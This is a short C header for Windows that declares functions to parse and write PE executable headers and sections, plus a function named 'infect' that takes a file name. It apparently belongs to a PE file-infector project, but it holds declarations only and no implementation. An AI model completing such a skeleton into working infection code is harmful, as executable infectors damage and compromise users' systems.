#pragma once
#define _CRT_SECURE_NO_WARNINGS_GLOBALS
#define _CRT_SECURE_NO_WARNINGS
#ifndef HEADER
#define HEADER
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<windows.h>
#include<tchar.h>
#include <Locale.h>
#include <winternl.h>
#include "pm.h"
#endif
//#define _DEBUG_H 


BOOL setBytes(BYTE* dst, size_t size, long offset, HANDLE hFile);

BOOL getBytes(BYTE* dst, size_t size, long offset, HANDLE hFile);

PE init_file(WCHAR* filename);

void close_file(PE p);

IMAGE_DOS_HEADER get_IMAGE_DOS_HEADER(HANDLE hFile);

_IMAGE_NT_HEADERS get_IMAGE_NT_HEADER(HANDLE hFile, PE p);

void get_IMAGE_SECTION_HEADERS(_IMAGE_SECTION_HEADER** dst, int cnt, LONG e_lfanew, HANDLE hFile);

int infect(WCHAR* filename);

